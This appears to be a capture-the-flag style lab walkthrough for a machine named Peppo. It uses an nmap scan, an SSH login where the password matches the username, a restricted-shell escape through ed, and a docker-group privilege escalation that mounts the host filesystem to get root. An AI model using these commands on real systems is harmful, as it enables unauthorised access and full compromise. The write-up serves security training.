---
icon: ubuntu
---

# Peppo - Hard

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.159.60 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 03:56 EDT
Nmap scan report for 192.168.159.60
Host is up (0.032s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE           VERSION
22/tcp    open   ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
|_auth-owners: root
| ssh-hostkey: 
|   2048 75:4c:02:01:fa:1e:9f:cc:e4:7b:52:fe:ba:36:85:a9 (RSA)
|   256 b7:6f:9c:2b:bf:fb:04:62:f4:18:c9:38:f4:3d:6b:2b (ECDSA)
|_  256 98:7f:b6:40:ce:bb:b5:57:d5:d1:3c:65:72:74:87:c3 (ED25519)
53/tcp    closed domain
113/tcp   open   ident             FreeBSD identd
|_auth-owners: nobody
5432/tcp  open   postgresql        PostgreSQL DB 9.6.0 or later
8080/tcp  open   http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
|_http-title: Redmine
| http-robots.txt: 4 disallowed entries 
|_/issues/gantt /issues/calendar /activity /search
|_http-server-header: WEBrick/1.4.2 (Ruby/2.6.6/2020-03-31)
10000/tcp open   snet-sensor-mgmt?
|_auth-owners: eleanor
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Thu, 02 Oct 2025 23:58:06 GMT
|     Connection: close
|     Hello World
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Thu, 02 Oct 2025 23:58:00 GMT
|     Connection: close
|_    Hello World
```

Nmap scan discovered an SSH account whose password is identical to the username

<figure><img src="../../.gitbook/assets/image (2341).png" alt=""><figcaption></figcaption></figure>

```
netexec ssh 192.168.159.60 -u eleanor -p eleanor
```

<figure><img src="../../.gitbook/assets/image (2342).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2343).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2345).png" alt=""><figcaption></figcaption></figure>

The path is terrible here we can't access any commands.

Use the ed as a command line editor to escape the jail&#x20;

```
ed
!/bin/bash
```

```
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

<figure><img src="../../.gitbook/assets/image (2346).png" alt=""><figcaption></figcaption></figure>

We are out!

## <mark style="color:blue;">Privilege escalation</mark>

### <mark style="color:$primary;">Docker Group Privesc</mark>

<figure><img src="../../.gitbook/assets/image (2347).png" alt=""><figcaption></figcaption></figure>

eleanor is in the docker group, [**GTFObins**](https://gtfobins.github.io/gtfobins/docker/#shell) **has** a privesc available.

<figure><img src="../../.gitbook/assets/image (2348).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2349).png" alt=""><figcaption></figcaption></figure>

Alpine is not there, ok I am going to check the available images:

```
docker images
```

<figure><img src="../../.gitbook/assets/image (2350).png" alt=""><figcaption></figcaption></figure>

```
docker run -v /:/mnt --rm -it redmine chroot /mnt sh
```

<figure><img src="../../.gitbook/assets/image (2351).png" alt=""><figcaption></figcaption></figure>

And we got root!
